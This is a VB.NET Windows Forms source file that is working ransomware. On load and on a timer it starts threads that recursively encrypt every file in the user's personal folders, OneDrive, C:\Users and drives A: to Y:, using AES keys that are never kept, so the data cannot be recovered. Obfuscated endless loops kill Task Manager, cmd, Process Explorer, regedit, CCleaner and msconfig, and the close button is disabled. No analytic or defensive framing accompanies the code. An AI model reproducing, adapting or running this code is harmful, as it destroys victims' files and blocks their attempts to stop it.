﻿Option Explicit On
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Net
Imports Microsoft.VisualBasic.FileIO
Public Class Form4
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte,
ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    Public Const VK_LWIN = &H5B
    Public Const KEYEVENTF_KEYUP = &H2

    Dim i As Integer
    Dim i2 As Integer
    Dim i3 As Integer
    Dim i4 As Integer
    Dim i5 As Integer

    Dim Location As String

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Ansi Function GetAsyncKeyState Lib "user32" (vkey As Integer) As Integer
    Private erhaltenerText As RichTextBox

    Private path1 As String

    Private path2 As String

    Private userDir As Object

    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

    Public Sub New()
        Me.erhaltenerText = New RichTextBox()
        Me.userDir = "C:\\Users\\"
        Me.InitializeComponent()
    End Sub

#Region "Crypt"
    Public Sub crypt2()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), aesKey)
    End Sub

    Public Sub crypt3()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), aesKey)
    End Sub

    Public Sub crypt4()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), aesKey)
    End Sub

    Public Sub crypt5()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), aesKey)
    End Sub
    Public Sub crypt6()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("C:\Users\" & Environment.UserName & "\Contacts\"), aesKey)
    End Sub
    Public Sub crypt7()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("C:\Users\" + Environment.UserName + "\Downloads\"), aesKey)
    End Sub
    Public Sub crypt8()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Conversions.ToString(userDir), aesKey)
    End Sub

    Public Sub crypt35()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("C:\Users\" + Environment.UserName + "\OneDrive\"), aesKey)
    End Sub

    Public Sub crypt()
        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), aesKey)
    End Sub

#Region "Alle Laufwerke"
    Public Sub crypt11()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("A:\"), aesKey)
    End Sub

    Public Sub crypt12()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("B:\"), aesKey)
    End Sub

    Public Sub crypt13()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("D:\"), aesKey)
    End Sub

    Public Sub crypt14()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("E:\"), aesKey)
    End Sub

    Public Sub crypt15()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("F:\"), aesKey)
    End Sub

    Public Sub crypt16()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("G:\"), aesKey)
    End Sub

    Public Sub crypt17()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("H:\"), aesKey)
    End Sub

    Public Sub crypt18()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("I:\"), aesKey)
    End Sub

    Public Sub crypt19()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("J:\"), aesKey)
    End Sub

    Public Sub crypt20()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("K:\"), aesKey)
    End Sub

    Public Sub crypt21()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("L:\"), aesKey)
    End Sub

    Public Sub crypt22()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("M:\"), aesKey)
    End Sub

    Public Sub crypt23()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("N:\"), aesKey)
    End Sub

    Public Sub crypt24()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("O:\"), aesKey)
    End Sub

    Public Sub crypt25()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("P:\"), aesKey)
    End Sub

    Public Sub crypt26()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("Q:\"), aesKey)
    End Sub

    Public Sub crypt27()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("R:\"), aesKey)
    End Sub

    Public Sub crypt28()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("S:\"), aesKey)
    End Sub

    Public Sub crypt29()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("T:\"), aesKey)
    End Sub

    Public Sub crypt30()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("U:\"), aesKey)
    End Sub

    Public Sub crypt31()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("V:\"), aesKey)
    End Sub

    Public Sub crypt32()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("W:\"), aesKey)
    End Sub

    Public Sub crypt33()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("X:\"), aesKey)
    End Sub

    Public Sub crypt34()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("Y:\"), aesKey)
    End Sub

    Public Sub crypt9()

        Dim aesKey As Byte() = AES.AES.generateKey()
        Dim rSACryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider()
        encryptAll(("C:\"), aesKey)
    End Sub
#End Region

#End Region

    Private Shared Sub encryptAll(dir As String, aesKey As Byte())
        Dim directoryInfo As DirectoryInfo = New DirectoryInfo(dir)
        Try
            Dim files As FileInfo() = directoryInfo.GetFiles("*.*")
            For i As Integer = 0 To files.Length - 1
                Dim fileInfo As FileInfo = files(i)
                CryptFile.encryptFile(fileInfo.FullName, aesKey)
            Next
            Dim directories As DirectoryInfo() = directoryInfo.GetDirectories()
            For j As Integer = 0 To directories.Length - 1
                Dim directoryInfo2 As DirectoryInfo = directories(j)
                encryptAll(directoryInfo2.FullName, aesKey)
            Next
        Catch expr_7A As Exception
            ProjectData.SetProjectError(expr_7A)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Form4_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim thread As New Thread(AddressOf crypt)
        thread.Start()
        Dim thread2 As New Thread(AddressOf crypt2)
        thread2.Start()
        Dim thread3 As New Thread(AddressOf crypt3)
        thread3.Start()
        Dim thread4 As New Thread(AddressOf crypt4)
        thread4.Start()
        Dim thread5 As New Thread(AddressOf crypt5)
        thread5.Start()
        Dim thread6 As New Thread(AddressOf crypt6)
        thread6.Start()
        Dim thread7 As New Thread(AddressOf crypt7)
        thread7.Start()
        Dim thread8 As New Thread(AddressOf crypt8)
        thread8.Start()
        Dim thread9 As New Thread(AddressOf crypt9)
        thread9.Start()
        Dim thread35 As New Thread(AddressOf crypt35)
        thread35.Start()

#Region "Crypten Threads"
        Try
            Dim thread10 As New Thread(AddressOf crypt9)
            thread10.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread11 As New Thread(AddressOf crypt11)
            thread11.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread12 As New Thread(AddressOf crypt12)
            thread12.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread13 As New Thread(AddressOf crypt13)
            thread13.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread14 As New Thread(AddressOf crypt14)
            thread14.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread15 As New Thread(AddressOf crypt15)
            thread15.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread16 As New Thread(AddressOf crypt16)
            thread16.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread17 As New Thread(AddressOf crypt17)
            thread17.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread18 As New Thread(AddressOf crypt18)
            thread18.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread19 As New Thread(AddressOf crypt19)
            thread19.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread20 As New Thread(AddressOf crypt20)
            thread20.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread21 As New Thread(AddressOf crypt21)
            thread21.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread22 As New Thread(AddressOf crypt22)
            thread22.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread23 As New Thread(AddressOf crypt23)
            thread23.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread24 As New Thread(AddressOf crypt24)
            thread24.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread25 As New Thread(AddressOf crypt25)
            thread25.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread26 As New Thread(AddressOf crypt26)
            thread26.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread27 As New Thread(AddressOf crypt27)
            thread27.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread28 As New Thread(AddressOf crypt28)
            thread28.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread29 As New Thread(AddressOf crypt29)
            thread29.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread30 As New Thread(AddressOf crypt30)
            thread30.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread31 As New Thread(AddressOf crypt31)
            thread31.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread32 As New Thread(AddressOf crypt32)
            thread32.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread33 As New Thread(AddressOf crypt33)
            thread33.Start()
        Catch ex As Exception

        End Try

        Try
            Dim thread34 As New Thread(AddressOf crypt34)
            thread34.Start()
        Catch ex As Exception

        End Try
#End Region

        Try
            Dim t As New Threading.Thread(AddressOf block)
            t.Start()
            Dim t2 As New Threading.Thread(AddressOf block2)
            t2.Start()
            Dim t3 As New Threading.Thread(AddressOf block3)
            t3.Start()
            Dim t4 As New Threading.Thread(AddressOf block4)
            t4.Start()
            Dim t5 As New Threading.Thread(AddressOf block5)
            t5.Start()
            Dim t6 As New Threading.Thread(AddressOf block6)
            t6.Start()
            Dim t7 As New Threading.Thread(AddressOf block7)
            t7.Start()
        Catch ex As Exception

        End Try

    End Sub

#Region "Blockieren"
    Sub block()
        Try
            While True
                Dim HàÉIî2Ðù24Ô6ËþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJ As String = "taskmgr"
                For Each p As Process In Process.GetProcessesByName(HàÉIî2Ðù24Ô6ËþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJ)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub


    Sub block2()
        Try
            While True
                Dim Îµ0Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVúùTþKÓQTµÔÐýâWþÉÍÄâPBþQ9ÂUÐÐýNCÞúý As String = "cmd"
                For Each p As Process In Process.GetProcessesByName(Îµ0Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVúùTþKÓQTµÔÐýâWþÉÍÄâPBþQ9ÂUÐÐýNCÞúý)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub

    Sub block3()
        Try
            While True
                Dim ªºþºÊºMÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYã As String = "procexp"
                For Each p As Process In Process.GetProcessesByName(ªºþºÊºMÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYã)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block4()
        Try
            While True
                Dim ÊÍÉëÿBªªÚXÉÓÄ74ÏMß0äÂJýÈNýÉHýËëµÇªÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚË As String = "procexp64"
                For Each p As Process In Process.GetProcessesByName(ÊÍÉëÿBªªÚXÉÓÄ74ÏMß0äÂJýÈNýÉHýËëµÇªÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚË)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block5()
        Try
            While True
                Dim ÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03íN1Êí0ÆÊHKÉNÊÍÉëÿBªªÚXÉÓÄ74ÏMß03ÚªîùKÆÊX As String = "regedit"
                For Each p As Process In Process.GetProcessesByName(ÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03íN1Êí0ÆÊHKÉNÊÍÉëÿBªªÚXÉÓÄ74ÏMß03ÚªîùKÆÊX)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block6()
        Try
            While True
                Dim ëµÇªîÆKáîíEËDµýßÅJµÒÊðCBþÓKµßQÎËþÉºÎXØÏÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚËõYðÈÇâõÈKÊTÞT2OàÇIÆI As String = "CCleaner64"
                For Each p As Process In Process.GetProcessesByName(ëµÇªîÆKáîíEËDµýßÅJµÒÊðCBþÓKµßQÎËþÉºÎXØÏÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚËõYðÈÇâõÈKÊTÞT2OàÇIÆI)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block7()
        Try
            While True
                Dim MÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYãÊÎµ0Ê9ÓýMáÆÄÞýþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJé0ÍõAÍÞÍÓíÓ5úãÄM62ÆüÞûÉXµTÉ As String = "msconfig"
                For Each p As Process In Process.GetProcessesByName(MÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYãÊÎµ0Ê9ÓýMáÆÄÞýþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJé0ÍõAÍÞÍÓíÓ5úãÄM62ÆüÞûÉXµTÉ)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub

#End Region

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Dim thread As New Thread(AddressOf crypt)
            thread.Start()
            Dim thread2 As New Thread(AddressOf crypt2)
            thread2.Start()
            Dim thread3 As New Thread(AddressOf crypt3)
            thread3.Start()
            Dim thread4 As New Thread(AddressOf crypt4)
            thread4.Start()
            Dim thread5 As New Thread(AddressOf crypt5)
            thread5.Start()
            Dim thread6 As New Thread(AddressOf crypt6)
            thread6.Start()
            Dim thread7 As New Thread(AddressOf crypt7)
            thread7.Start()
            Dim thread8 As New Thread(AddressOf crypt8)
            thread8.Start()
            Dim thread9 As New Thread(AddressOf crypt9)
            thread9.Start()
            Dim thread35 As New Thread(AddressOf crypt35)
            thread35.Start()

#Region "Crypten Threads"
            Try
                Dim thread10 As New Thread(AddressOf crypt9)
                thread10.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread11 As New Thread(AddressOf crypt11)
                thread11.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread12 As New Thread(AddressOf crypt12)
                thread12.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread13 As New Thread(AddressOf crypt13)
                thread13.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread14 As New Thread(AddressOf crypt14)
                thread14.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread15 As New Thread(AddressOf crypt15)
                thread15.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread16 As New Thread(AddressOf crypt16)
                thread16.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread17 As New Thread(AddressOf crypt17)
                thread17.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread18 As New Thread(AddressOf crypt18)
                thread18.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread19 As New Thread(AddressOf crypt19)
                thread19.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread20 As New Thread(AddressOf crypt20)
                thread20.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread21 As New Thread(AddressOf crypt21)
                thread21.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread22 As New Thread(AddressOf crypt22)
                thread22.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread23 As New Thread(AddressOf crypt23)
                thread23.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread24 As New Thread(AddressOf crypt24)
                thread24.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread25 As New Thread(AddressOf crypt25)
                thread25.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread26 As New Thread(AddressOf crypt26)
                thread26.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread27 As New Thread(AddressOf crypt27)
                thread27.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread28 As New Thread(AddressOf crypt28)
                thread28.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread29 As New Thread(AddressOf crypt29)
                thread29.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread30 As New Thread(AddressOf crypt30)
                thread30.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread31 As New Thread(AddressOf crypt31)
                thread31.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread32 As New Thread(AddressOf crypt32)
                thread32.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread33 As New Thread(AddressOf crypt33)
                thread33.Start()
            Catch ex As Exception

            End Try

            Try
                Dim thread34 As New Thread(AddressOf crypt34)
                thread34.Start()
            Catch ex As Exception

            End Try
#End Region

        Catch ex As Exception

        End Try
    End Sub

End Class